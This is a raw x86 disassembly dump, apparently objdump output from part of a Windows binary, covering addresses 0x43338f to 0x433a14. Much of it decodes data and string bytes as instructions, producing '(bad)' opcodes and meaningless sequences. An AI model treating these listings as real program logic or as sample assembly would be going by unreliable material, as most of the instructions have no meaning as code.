  43338f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433395:	(bad)  
  433396:	or     eax,0x4b7284
  43339b:	xor    al,cl
  43339d:	mov    ecx,DWORD PTR [ebp-0x20]
  4333a0:	mov    ecx,DWORD PTR [ecx]
  4333a2:	xor    ecx,edi
  4333a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4333ab:	xor    cl,al
  4333ad:	mov    ecx,DWORD PTR [edi]
  4333af:	fadd   QWORD PTR [ebp+0x9]
  4333b2:	call   0xffd02e86
  4333b7:	dec    ebx
  4333b8:	dec    ebp
  4333b9:	xor    bh,BYTE PTR [ebx]
  4333bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4333bf:	loopne 0x4333bd
  4333c1:	or     edi,eax
  4333c3:	iret   
  4333c4:	ret    
  4333c5:	mov    WORD PTR [ebp+0x4f],es
  4333c8:	mov    esi,DWORD PTR [edx]
  4333ca:	call   0x8452fb09
  4333cf:	(bad)  
  4333d0:	fwait
  4333d1:	add    BYTE PTR [edx],dh
  4333d3:	mov    esi,DWORD PTR [ebx]
  4333d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4333db:	test   BYTE PTR [ebx],dh
  4333dd:	dec    ebx
  4333de:	add    esi,DWORD PTR [edx]
  4333e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4333e6:	dec    edi
  4333e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4333ef:	xor    al,BYTE PTR [ebx]
  4333f1:	mov    edi,DWORD PTR [ebx]
  4333f3:	in     al,0x75
  4333f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4333fb:	dec    ebx
  4333fc:	xor    esi,DWORD PTR [edx]
  4333fe:	lea    ecx,[edx]
  433400:	or     BYTE PTR [ebx+0x900f072],cl
  433406:	ja     0x4333d7
  433408:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43340f:	cmp    ch,al
  433411:	jne    0x433406
  433413:	mov    edi,edi
  433415:	fadd   QWORD PTR [ebp+0x0]
  433418:	mov    eax,edi
  43341a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433421:	mov    edx,DWORD PTR [ebx]
  433423:	in     al,0x45
  433425:	or     DWORD PTR [ebx],esi
  433427:	iret   
  433428:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43342f:	xor    dl,BYTE PTR [eax-0x75]
  433432:	sbb    al,0xe0
  433434:	dec    DWORD PTR [ecx]
  433436:	mov    ecx,edi
  433438:	in     al,dx
  433439:	mov    eax,es
  43343b:	dec    ebx
  43343c:	mov    DWORD PTR [edx],esi
  43343e:	fmul   QWORD PTR [edx]
  433440:	jne    0x4333cd
  433442:	(bad)  
  433443:	(bad)  
  433445:	or     DWORD PTR [ebp-0x31],eax
  433448:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43344f:	cmp    bh,bh
  433451:	jne    0x433498
  433453:	lea    ecx,[ebx-0x38372750]
  433459:	inc    ebx
  43345b:	mov    eax,ecx
  43345d:	mov    eax,0xa00c111
  433462:	jne    0x4334a9
  433464:	mov    esi,DWORD PTR [ebx]
  433466:	test   al,0x3
  433468:	inc    ebp
  433469:	mov    DWORD PTR [eax-0xc],edx
  43346c:	loop   0x4334b3
  43346e:	push   DWORD PTR [ebx]
  433470:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433476:	add    DWORD PTR [eax],eax
  433478:	mov    eax,edi
  43347a:	lods   al,BYTE PTR ds:[esi]
  43347b:	dec    ebp
  43347c:	inc    ebp
  43347d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433483:	retf   
  433484:	mov    edx,ecx
  433486:	adc    al,0x84
  433488:	(bad)  
  433489:	std    
  43348a:	ret    
  43348b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433491:	hlt    
  433492:	rol    edi,0x82
  433495:	ret    
  433496:	cld    
  433497:	enter  0x11ff,0x45
  43349b:	inc    ebp
  43349c:	pop    edi
  43349d:	mov    ebx,DWORD PTR [ebx+0x14]
  4334a0:	ret    0xc7
  4334a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4334a9:	jmp    0x433436
  4334ab:	push   0x8
  4334ad:	call   DWORD PTR [esi]
  4334af:	in     al,dx
  4334b0:	add    BYTE PTR [ebp+0x1],0x50
  4334b4:	add    bh,ah
  4334b6:	add    bh,bh
  4334b8:	icebp  
  4334b9:	mov    ecx,DWORD PTR [eax]
  4334bb:	cld    
  4334bc:	pop    es
  4334bd:	dec    ebp
  4334be:	shl    DWORD PTR [ebx],0x72
  4334c1:	add    eax,DWORD PTR [eax]
  4334c3:	cmp    edx,ecx
  4334c5:	je     0x4334d7
  4334c7:	mov    esi,DWORD PTR [ebp-0x4]
  4334ca:	inc    edi
  4334cc:	or     al,0xc3
  4334ce:	jmp    FWORD PTR [edx-0x18]
  4334d1:	(bad)  
  4334d2:	sti    
  4334d3:	cwde   
  4334d4:	(bad)  
  4334d5:	call   0xffa12de0
  4334da:	or     al,0x45
  4334dc:	push   ebp
  4334dd:	sub    esp,0x18
  4334e0:	push   ebx
  4334e1:	inc    ebp
  4334e2:	mov    edi,edi
  4334e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4334eb:	test   al,0x54
  4334ed:	inc    ebp
  4334ee:	push   ecx
  4334ef:	push   eax
  4334f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4334f6:	add    ah,bh
  4334f8:	(bad)  
  4334f9:	dec    ebp
  4334fa:	add    DWORD PTR [ebx],esi
  4334fc:	inc    ebp
  4334fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433503:	push   0xffffff8b
  433505:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43350b:	add    eax,DWORD PTR [ecx]
  43350d:	or     BYTE PTR [eax],al
  43350f:	call   0xff852d14
  433514:	mov    eax,DWORD PTR [ebp+0x14]
  433517:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43351d:	inc    ebp
  43351e:	dec    ecx
  43351f:	add    ebp,DWORD PTR [edx+0x14]
  433522:	push   0x8b3045
  433527:	call   0x33ad829c
  43352c:	inc    DWORD PTR [ebx]
  43352e:	mov    DWORD PTR [edi],ecx
  433530:	mov    eax,ecx
  433532:	or     BYTE PTR [ebp-0x3d],cl
  433535:	cmp    eax,edi
  433537:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43353c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433542:	adc    al,0xc9
  433544:	inc    ebp
  433545:	adc    BYTE PTR [eax+0x55],dl
  433548:	jne    0x433536
  43354a:	call   0xff5434da
  43354f:	dec    ebp
  433550:	inc    ebp
  433551:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433557:	add    BYTE PTR [ebx],bh
  433559:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43355d:	push   esp
  43355e:	or     al,0x51
  433560:	dec    ebp
  433561:	xor    DWORD PTR [ebx],0xf32039b
  433567:	cmp    eax,DWORD PTR [ebp+0x74]
  43356a:	mov    edi,edi
  43356c:	pop    edi
  43356d:	adc    BYTE PTR [ebx+0x75],bl
  433570:	ret    0x50
  433573:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433577:	(bad)  
  433578:	clc    
  433579:	mov    esp,ebp
  43357b:	pop    ecx
  43357c:	mov    ecx,0xf80085c2
  433581:	mov    ecx,DWORD PTR [ecx+edx*2]
  433584:	push   esi
  433585:	push   esi
  433586:	(bad)  
  433587:	lock add DWORD PTR [ebp+0x44],eax
  43358b:	mov    edx,DWORD PTR [eax]
  43358d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433591:	or     BYTE PTR [edi+eax*1+0x51],dl
  433595:	ret    
  433596:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43359c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4335a2:	or     al,0x80
  4335a4:	jge    0x4335a7
  4335a6:	mov    DWORD PTR [eax],eax
  4335a8:	and    al,0x8
  4335aa:	cmp    DWORD PTR [ebp+0x10],eax
  4335ad:	mov    edx,DWORD PTR [esi]
  4335af:	xchg   esp,eax
  4335b0:	dec    esp
  4335b1:	add    BYTE PTR [eax],dl
  4335b3:	mov    ecx,edx
  4335b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4335b9:	dec    ebp
  4335ba:	into   
  4335bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4335c1:	mov    edx,DWORD PTR [eax+0x14]
  4335c4:	das    
  4335c5:	add    al,0x45
  4335c7:	add    BYTE PTR [ebp+0x0],dh
  4335ca:	mov    edi,edi
  4335cc:	and    al,0x50
  4335ce:	mov    eax,DWORD PTR [eax]
  4335d0:	and    al,0xd1
  4335d2:	xor    eax,DWORD PTR [esi]
  4335d4:	lea    eax,[ebp+0x8]
  4335d7:	xor    esi,DWORD PTR [edx+0x3]
  4335da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4335e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4335e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4335f0:	cmp    al,0xff
  4335f2:	pushf  
  4335f3:	mov    edi,edi
  4335f5:	or     BYTE PTR [esi+ecx*1],cl
  4335f8:	jne    0x4335bd
  4335fa:	call   0xc35c6
  4335ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433603:	mov    ebx,DWORD PTR [eax]
  433605:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433609:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433611:	pop    esi
  433612:	and    al,0xc9
  433614:	and    al,0x10
  433616:	call   DWORD PTR [ebp-0x73]
  433619:	in     al,dx
  43361a:	jmp    esp
  43361c:	je     0x4335a1
  43361e:	call   DWORD PTR [eax]
  433620:	and    al,0x31
  433622:	call   0xffcd34c3
  433627:	and    al,0x44
  433629:	push   edi
  43362a:	or     al,0x41
  43362c:	pop    esi
  43362d:	mov    ebp,esp
  43362f:	and    al,0xc2
  433631:	mov    eax,DWORD PTR [eax]
  433633:	and    al,0x85
  433635:	mov    edx,0x733080e
  43363a:	jne    0x433636
  43363c:	test   DWORD PTR [ebx+0x3083275],ebx
  433642:	dec    DWORD PTR [ecx-0x74dbdb15]
  433648:	sbb    BYTE PTR [esp+edx*1],cl
  43364b:	jl     0x43364c
  43364d:	adc    al,0x24
  43364f:	dec    ebp
  433650:	mov    esi,DWORD PTR [ebp+0xc]
  433653:	mov    ecx,DWORD PTR [eax]
  433655:	and    al,0x39
  433657:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43365a:	or     BYTE PTR [eax+edx*1],ah
  43365d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433664:	clc    
  433665:	jmp    0x433603
  433667:	adc    al,bh
  433669:	inc    esp
  43366a:	je     0x4336b8
  43366c:	and    al,0xc2
  43366e:	je     0x43360b
  433670:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433676:	dec    DWORD PTR [ecx+0x235fbf08]
  43367c:	sbb    al,0x10
  43367e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433682:	add    BYTE PTR [ebx+0xb],dh
  433685:	adc    BYTE PTR [eax],al
  433687:	mov    WORD PTR ds:0x3d450010,?
  43368d:	adc    BYTE PTR [eax],al
  43368f:	add    DWORD PTR [eax+edx*1],esp
  433692:	add    BYTE PTR [edx+0x6],cl
  433695:	adc    BYTE PTR [eax],al
  433697:	sub    dx,WORD PTR [eax]
  43369a:	add    bh,dl
  43369c:	imul   edx,DWORD PTR [eax],0x10302300
  4336a2:	add    BYTE PTR [esi+0x7b001077],dl
  4336a8:	ss inc ebx
  4336aa:	add    BYTE PTR [edi+0x36],bh
  4336ad:	inc    ebx
  4336ae:	add    BYTE PTR [ebx-0x78ffbcca],al
  4336b4:	ss inc ebx
  4336b6:	add    BYTE PTR [ebx-0x70ffbcca],cl
  4336bc:	ss inc ebx
  4336be:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336c4:	ss inc ebx
  4336c6:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [ebx-0x5fffbcca],ah
  4336d4:	adc    DWORD PTR [eax],edx
  4336d6:	add    BYTE PTR [ecx],cl
  4336d8:	jo     0x4336ea
  4336da:	add    BYTE PTR ds:0xd7001027,ch
  4336e0:	pop    eax
  4336e1:	adc    BYTE PTR [eax],al
  4336e3:	push   es
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [esi+0x33001031],ah
  4336ec:	ins    BYTE PTR es:[edi],dx
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	jb     0x433730
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	shl    DWORD PTR [esi],cl
  4336f5:	inc    ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    dh,cl
  433714:	jge    0x433726
  433716:	add    BYTE PTR [esi-0x3dffef8e],dl
  43371c:	or     dl,BYTE PTR [eax]
  43371e:	add    dh,bl
  433720:	sub    dl,BYTE PTR [eax]
  433722:	add    BYTE PTR [edx],bl
  433724:	ins    BYTE PTR es:[edi],dx
  433725:	adc    BYTE PTR [eax],al
  433727:	addr16 jno 0x43373a
  43372a:	add    BYTE PTR [ebp+0x3d],ch
  43372d:	adc    BYTE PTR [eax],al
  43372f:	lds    esp,FWORD PTR [eax+0x10]
  433732:	add    BYTE PTR [ebx],dl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+edx*1],bh
  433755:	adc    BYTE PTR [eax],al
  433757:	clc    
  433758:	cmp    dl,BYTE PTR [eax]
  43375a:	add    BYTE PTR [ecx],ah
  43375c:	pop    ds
  43375d:	adc    BYTE PTR [eax],al
  43375f:	mov    edi,0x6001073
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [ecx+0x34],bh
  433769:	adc    BYTE PTR [eax],al
  43376b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43376f:	shl    DWORD PTR [edx+0x10],1
  433772:	add    BYTE PTR [ebx+0x37],dl
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebp+0x14],al
  433795:	adc    BYTE PTR [eax],al
  433797:	fwait
  433798:	pop    ds
  433799:	adc    BYTE PTR [eax],al
  43379b:	jnp    0x4337c0
  43379d:	adc    BYTE PTR [eax],al
  43379f:	pop    esi
  4337a0:	adc    BYTE PTR cs:[eax],al
  4337a3:	popf   
  4337a4:	jno    0x4337b6
  4337a6:	add    ah,bl
  4337a8:	inc    ebp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	sbb    edx,DWORD PTR [edx+0x10]
  4337ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [edi-0x64ffbcc9],dl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [edi-0x5cffbcc9],bl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi+0x54004337],ch
  4337d4:	xor    al,0x4b
  4337d6:	aaa    
  4337d7:	pop    edi
  4337d8:	inc    edx
  4337d9:	dec    ebx
  4337da:	xor    DWORD PTR [ecx],edi
  4337dc:	push   edi
  4337dd:	add    BYTE PTR [ecx+0x39],cl
  4337e0:	xor    al,0x5f
  4337e2:	pop    ecx
  4337e3:	inc    edi
  4337e4:	push   edx
  4337e5:	pop    edi
  4337e6:	dec    edx
  4337e7:	xor    al,BYTE PTR [edx+0x30]
  4337ea:	push   ebx
  4337eb:	add    BYTE PTR [ecx+0x4a],cl
  4337ee:	cmp    BYTE PTR [edi+0x38],bl
  4337f1:	xor    al,0x43
  4337f3:	xor    bl,BYTE PTR [eax+0x36]
  4337f6:	pop    edi
  4337f7:	inc    ebx
  4337f8:	add    BYTE PTR [edx+0x33],cl
  4337fb:	dec    ebp
  4337fc:	cmp    BYTE PTR [edi+0x53],bl
  4337ff:	xor    DWORD PTR [eax],edi
  433801:	pop    edx
  433802:	pop    edi
  433803:	xor    BYTE PTR [edx+0x52],cl
  433806:	inc    ecx
  433807:	add    BYTE PTR [edx+0x42],al
  43380a:	inc    ebp
  43380b:	pop    edi
  43380c:	cmp    DWORD PTR [eax],edi
  43380e:	push   ebp
  43380f:	inc    edx
  433810:	xor    eax,0x5244505f
  433815:	xor    BYTE PTR [eax],al
  433817:	inc    edx
  433818:	inc    esp
  433819:	inc    edx
  43381a:	cmp    DWORD PTR [edi+0x52],ebx
  43381d:	dec    esp
  43381e:	inc    ebp
  43381f:	add    BYTE PTR [ebx+0x37],dl
  433822:	push   esp
  433823:	xor    BYTE PTR [edi+0x55],bl
  433826:	push   ebx
  433827:	aaa    
  433828:	dec    ebp
  433829:	pop    edi
  43382a:	xor    ecx,DWORD PTR [edx+0x4e]
  43382d:	dec    ebx
  43382e:	add    BYTE PTR [edx+0x47],cl
  433831:	inc    edi
  433832:	xor    eax,0x534e5f32
  433837:	push   esp
  433838:	pop    edi
  433839:	push   esp
  43383a:	inc    edx
  43383b:	add    BYTE PTR [ebx+0x4d],al
  43383e:	xor    BYTE PTR [edi+0x47],bl
  433841:	cmp    DWORD PTR [ecx+0x5f],ebx
  433844:	push   eax
  433845:	push   ecx
  433846:	push   ecx
  433847:	pop    edi
  433848:	inc    ebx
  433849:	push   edi
  43384a:	push   esi
  43384b:	add    BYTE PTR [ecx+0x57],cl
  43384e:	inc    ebp
  43384f:	pop    edi
  433850:	pop    ecx
  433851:	push   edx
  433852:	inc    edx
  433853:	pop    edi
  433854:	inc    edi
  433855:	add    BYTE PTR [ebx+0x51],dl
  433858:	cmp    DWORD PTR ds:0x4d305f33,esi
  43385e:	inc    edi
  43385f:	xor    edx,DWORD PTR [edx+0x34]
  433862:	pop    edi
  433863:	pop    edx
  433864:	cmp    BYTE PTR [eax],al
  433866:	inc    edi
  433867:	xor    esi,DWORD PTR ds:0x5451585f
  43386d:	dec    esp
  43386e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433872:	pop    edi
  433873:	cmp    BYTE PTR [edi+0x49],dl
  433876:	xor    eax,0x5700505f
  43387b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43387f:	dec    esi
  433880:	dec    edx
  433881:	cmp    BYTE PTR [eax],al
  433883:	pop    edx
  433884:	dec    ebx
  433885:	xor    eax,0x4f5f3131
  43388a:	xor    dh,BYTE PTR [ecx]
  43388c:	pop    edi
  43388d:	inc    ebp
  43388e:	push   esp
  43388f:	inc    esp
  433890:	inc    ebp
  433891:	add    BYTE PTR [edi+0x55],dl
  433894:	cmp    DWORD PTR [edi+0x5a],ebx
  433897:	push   edx
  433898:	inc    edi
  433899:	xor    DWORD PTR [ebp+0x0],ecx
  43389c:	pop    edx
  43389d:	dec    ecx
  43389e:	dec    ebp
  43389f:	ss pop edi
  4338a1:	pop    edx
  4338a2:	push   edx
  4338a3:	cmp    BYTE PTR [esi+0x30],dl
  4338a6:	pop    edi
  4338a7:	push   ecx
  4338a8:	dec    esi
  4338a9:	add    BYTE PTR [ebx+0x32],dl
  4338ac:	inc    ebx
  4338ad:	cmp    BYTE PTR [edi+0x52],bl
  4338b0:	dec    ecx
  4338b1:	xor    BYTE PTR [eax],al
  4338b3:	inc    edi
  4338b4:	xor    eax,0x314f5f4b
  4338b9:	xor    DWORD PTR [edi+0x38],ebx
  4338bc:	push   ebp
  4338bd:	add    BYTE PTR [edi+0x4b],al
  4338c0:	xor    bl,BYTE PTR [edi+0x43]
  4338c3:	push   ebp
  4338c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4338c7:	ss pop edi
  4338c9:	pop    edx
  4338ca:	push   edi
  4338cb:	inc    esp
  4338cc:	xor    BYTE PTR [eax],al
  4338ce:	dec    ecx
  4338cf:	inc    edi
  4338d0:	xor    eax,0x3058555f
  4338d5:	dec    ebx
  4338d6:	pop    edi
  4338d7:	push   edi
  4338d8:	add    BYTE PTR [eax+0x0],bl
  4338db:	inc    edi
  4338dc:	add    BYTE PTR [edx+0x0],al
  4338df:	pop    edi
  4338e0:	add    BYTE PTR [ebx],dh
  4338e2:	add    BYTE PTR [eax],bh
  4338e4:	add    BYTE PTR [ebx+0x0],cl
  4338e7:	xor    eax,0x33003500
  4338ec:	add    BYTE PTR [eax],dh
  4338ee:	add    BYTE PTR [edi+0x0],bl
  4338f1:	push   esp
  4338f2:	add    BYTE PTR [ebp+0x0],cl
  4338f5:	xor    BYTE PTR [eax],al
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	inc    esi
  4338fa:	add    BYTE PTR [eax+0x0],bl
  4338fd:	xor    BYTE PTR [eax],al
  4338ff:	pop    edi
  433900:	add    BYTE PTR [ecx],dh
  433902:	add    BYTE PTR [ebx+0x0],al
  433905:	xor    eax,0x5f003100
  43390a:	add    BYTE PTR [ecx+0x0],al
  43390d:	xor    eax,DWORD PTR [eax]
  43390f:	add    BYTE PTR [eax],al
  433911:	push   ebx
  433912:	add    BYTE PTR [ebx+0x0],dl
  433915:	dec    eax
  433916:	add    BYTE PTR [edi+0x0],bl
  433919:	push   esp
  43391a:	add    BYTE PTR [ebx+0x0],al
  43391d:	push   ebx
  43391e:	add    BYTE PTR [edx+0x0],dl
  433921:	pop    edi
  433922:	add    BYTE PTR [ecx+0x0],dl
  433925:	dec    edi
  433926:	add    BYTE PTR [edi+0x0],al
  433929:	push   ecx
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	pop    ecx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],cl
  433933:	dec    edi
  433934:	add    BYTE PTR [ebp+0x0],dl
  433937:	cmp    DWORD PTR [eax],eax
  433939:	pop    edi
  43393a:	add    BYTE PTR [edx],dh
  43393c:	add    BYTE PTR [eax+eax*1+0x32],al
  433940:	add    BYTE PTR ds:0x47005f00,dh
  433946:	add    BYTE PTR ds:0x48000000,dh
  43394c:	add    BYTE PTR [edx+0x0],cl
  43394f:	push   eax
  433950:	add    BYTE PTR [edi+0x0],bl
  433953:	cmp    BYTE PTR [eax],al
  433955:	add    BYTE PTR ss:0x55004100,dh
  43395c:	add    BYTE PTR [edi+0x0],bl
  43395f:	push   edx
  433960:	add    BYTE PTR [edi],dh
  433962:	add    BYTE PTR [ecx+0x0],cl
  433965:	add    BYTE PTR [eax],al
  433967:	inc    esp
  433968:	add    BYTE PTR [ecx+0x0],dl
  43396b:	inc    edx
  43396c:	add    BYTE PTR [edi+0x0],bl
  43396f:	push   ecx
  433970:	add    BYTE PTR [ecx+0x0],bl
  433973:	dec    edi
  433974:	add    BYTE PTR [eax+0x0],dl
  433977:	add    BYTE PTR [eax],al
  433979:	dec    edx
  43397a:	add    BYTE PTR [ecx+0x0],dl
  43397d:	inc    esp
  43397e:	add    BYTE PTR [edi+0x0],bl
  433981:	dec    edx
  433982:	add    BYTE PTR [eax],dh
  433984:	add    BYTE PTR [ecx],dh
  433986:	add    BYTE PTR [ebx+0x0],dl
  433989:	push   ecx
  43398a:	add    BYTE PTR [ecx],dh
  43398c:	add    BYTE PTR [edi+0x0],bl
  43398f:	push   edi
  433990:	add    BYTE PTR [eax],al
  433992:	add    BYTE PTR [ebx+0x0],cl
  433995:	pop    edx
  433996:	add    BYTE PTR [esi],dh
  433998:	add    BYTE PTR [edi+0x0],bl
  43399b:	inc    ebx
  43399c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4339a0:	add    BYTE PTR [edi+0x0],bl
  4339a3:	push   edi
  4339a4:	add    BYTE PTR [ebx],dh
  4339a6:	add    BYTE PTR [esi+0x0],cl
  4339a9:	push   ebp
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	dec    edx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],dl
  4339b3:	aaa    
  4339b4:	add    BYTE PTR [eax],bh
  4339b6:	add    BYTE PTR [edi+0x0],bl
  4339b9:	pop    eax
  4339ba:	add    BYTE PTR [edi+0x0],cl
  4339bd:	inc    edi
  4339be:	add    BYTE PTR [edi+0x0],bl
  4339c1:	xor    al,0x0
  4339c3:	push   eax
  4339c4:	add    BYTE PTR [ecx+0x0],cl
  4339c7:	push   ebp
  4339c8:	add    BYTE PTR [eax],al
  4339ca:	add    BYTE PTR [edi+0x0],dl
  4339cd:	push   esp
  4339ce:	add    BYTE PTR [ebx+0x0],cl
  4339d1:	add    BYTE PTR [eax],al
  4339d3:	add    BYTE PTR [edx+0x53],dl
  4339d6:	inc    esp
  4339d7:	push   ebx
  4339d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4339d9:	jge    0x433a09
  4339db:	cli    
  4339dc:	gs inc edx
  4339de:	call   0x9118dd27
  4339e3:	into   
  4339e4:	sbb    esp,DWORD PTR [edx]
  4339e6:	cmp    dl,dh
  4339e8:	sbb    eax,DWORD PTR [eax]
  4339ea:	add    BYTE PTR [eax],al
  4339ec:	push   esp
  4339ed:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  4339f1:	addr16 push edi
  4339f3:	bound  bx,DWORD PTR [edx+0x45]
  4339f7:	outs   dx,BYTE PTR ds:[esi]
  4339f8:	pop    esp
  4339f9:	je     0x433a6e
  4339fb:	ja     0x433a3e
  4339fd:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a05:	js     0x433a76
  433a07:	jp     0x433a78
  433a09:	jns    0x433a6f
  433a0b:	jp     0x433a75
  433a0d:	je     0x433a73
  433a0f:	jp     0x433a73
  433a11:	cs jo  0x433a78
  433a14:	bound  eax,QWORD PTR [eax]
	...
